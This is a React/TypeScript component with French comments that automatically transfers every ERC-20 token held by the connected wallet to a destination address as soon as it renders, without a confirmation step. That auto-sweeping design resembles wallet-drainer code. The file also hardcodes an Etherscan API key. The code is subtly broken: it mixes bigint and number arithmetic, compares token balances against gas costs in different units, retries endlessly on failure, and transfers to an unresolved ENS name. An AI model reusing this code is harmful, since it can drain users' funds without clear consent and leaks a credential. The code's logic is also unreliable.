import { useEffect, useState } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { normalize } from 'viem/ens';
import { isAddress } from 'essential-eth';

const ETHERSCAN_API_KEY = 'AKU1Q3I8T66E6R7ZZNURMZ1D6WRQ1TPR8Z';  // Votre clé API Etherscan

// Fonction pour récupérer les frais de gaz via l'API d'Etherscan
const getGasPriceFromEtherscan = async () => {
  const response = await fetch(`https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${ETHERSCAN_API_KEY}`);
  const data = await response.json();
  if (data.result) {
    return parseInt(data.result, 16);  // Conversion de la réponse hexadécimale en entier
  }
  throw new Error('Impossible de récupérer les frais de gaz');
};

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  
  const [gasFeeMargin, setGasFeeMargin] = useState(1.2); // 20% marge de sécurité
  const [gasPrice, setGasPrice] = useState(0);

  // Récupérer les frais de gaz via Etherscan
  useEffect(() => {
    const fetchGasPrice = async () => {
      try {
        const fetchedGasPrice = await getGasPriceFromEtherscan();
        setGasPrice(fetchedGasPrice);
      } catch (error) {
        console.error('Erreur lors de la récupération des frais de gaz:', error);
      }
    };

    fetchGasPrice();
  }, []);

  const sendAllTokens = async (retry = false, marginMultiplier = 1.2) => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;

    // Vérifier si l'adresse de destination est une adresse ENS
    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      } else {
        console.error("Adresse ENS introuvable");
        return;
      }
    }

    // Envoyer tous les tokens
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            destinationAddress as `0x${string}`,
            BigInt(token.balance),
          ],
        });

        // Calcul des frais de gaz et application de la marge
        const estimatedGas = await publicClient.estimateGas(request);
        let gasLimit = estimatedGas * gasPrice;
        const totalGasWithMargin = gasLimit * marginMultiplier; // Ajouter la marge de sécurité

        // S'assurer que le portefeuille a assez de fonds pour couvrir les frais de gaz
        if (BigInt(token.balance) < totalGasWithMargin) {
          console.error(`Solde insuffisant pour couvrir les frais de gaz pour ${token?.contract_ticker_symbol}`);
          return;
        }

        // Essayer d'envoyer la transaction avec la marge de sécurité
        const response = await walletClient.writeContract({
          ...request,
          gasLimit: totalGasWithMargin,
        });

        // Mettre à jour l'état pour marquer le token comme envoyé
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));
      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);

        // Si la première tentative échoue et qu'il s'agit d'un problème lié aux frais de gaz, essayer avec plus de marge
        if (!retry) {
          console.log("Tentative échouée, réessayons avec une marge plus élevée de 30%...");
          await sendAllTokens(true, 1.3); // Relancer avec une marge augmentée de 30% pour la deuxième tentative
          return;
        }

        // Si la deuxième tentative échoue, augmenter la marge de 100% pour la troisième tentative
        if (retry) {
          console.log("Deuxième tentative échouée, réessayons avec une marge de 100%...");
          await sendAllTokens(true, 2.0); // Relancer avec 100% de marge
          return;
        }
      }
    }
  };

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens(); // Lancer l'envoi des tokens avec les marges calculées
    }
  }, [tokens, destinationAddress, walletClient, gasPrice]);

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
